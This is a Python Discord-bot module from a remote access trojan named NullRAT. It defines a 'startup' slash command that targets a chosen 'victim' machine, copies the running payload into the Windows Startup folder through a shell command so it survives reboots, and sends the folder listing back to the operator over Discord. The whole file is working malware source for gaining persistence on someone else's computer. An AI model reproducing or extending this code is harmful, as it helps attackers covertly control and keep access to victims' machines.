import disnake as discord
from disnake.ext import commands
from datetime import datetime
from sys import executable

import os, requests, subprocess
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Startup(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def startup(self, ctx, victim):
        """Add NullRAT to startup directory
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) != str(self.bot.identifier):
            return
        await ctx.response.send_message(
            embed = discord.Embed(
                title = "Last known RAT directory: \n" + self.bot.original_dir + "\n\nCurrent Directory: \n" + os.getcwd(), 
                color = 0x000000
            )
        )

        os.chdir(self.bot.original_dir)

        await ctx.channel.send(
            embed = discord.Embed(
                title = "Trying to copy payload into startup directory...", 
                color = 0x000000
            )
        )

        subprocess.run(
            f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            stdin=subprocess.PIPE
        )

        os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

        msg = "```\n"
        for value in os.listdir(): 
            msg += f'{value}\n'

        msg += "```"
        await ctx.channel.send( 
            embed=self.bot.genEmbed(
                "If you see the program here, you're good to go: ",
                datetime.now()
            )
        )

        await ctx.channel.send(msg)
        os.chdir(self.bot.original_dir)
            
def setup(bot: commands.Bot):
    bot.add_cog(Startup(bot)) 
